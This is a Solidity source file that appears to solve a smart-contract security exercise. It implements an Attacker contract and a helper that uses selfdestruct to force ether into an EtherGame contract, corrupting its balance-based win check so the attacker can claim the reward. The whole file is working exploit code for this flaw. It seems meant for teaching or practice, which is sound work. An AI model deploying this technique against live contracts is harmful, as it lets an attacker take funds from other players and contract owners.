// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {EtherGame} from "../src/Problem2.sol";

// A helper contract to forcefully send 7 ETH to EtherGame.
contract AttackerHelper {

    // Receives ETH.
    fallback() external payable {}

    // Forcefully sends ETH to the given contract.
    function sendEthTo(address game_addr) public payable {
        selfdestruct(payable(game_addr));
    }
}

contract Attacker {

    EtherGame public game; // The smart contract to exploit.

    // Initializes the smart contract to exploit.
    constructor(EtherGame _game) {
        game = _game;
    }

    // Since EtherGame uses its true balance to check if the
    // game is over, we can force a helper contract to send
    // ETH and then send in the final ETH from this contract.
    function attack() public {
        AttackerHelper helper = new AttackerHelper();
        payable(address(helper)).call{value: 7 ether}("");
        helper.sendEthTo(address(game));

        game.deposit{value: 1 ether}();
    }

    // Calls EtherGame's register() function.
    function register() public {
        game.register();
    }

    // Calls EtherGame's claimReward() function.
    function claim() public {
        game.claimReward();
    }

    // Fallback needed to receive the reward.
    fallback() external payable {}
}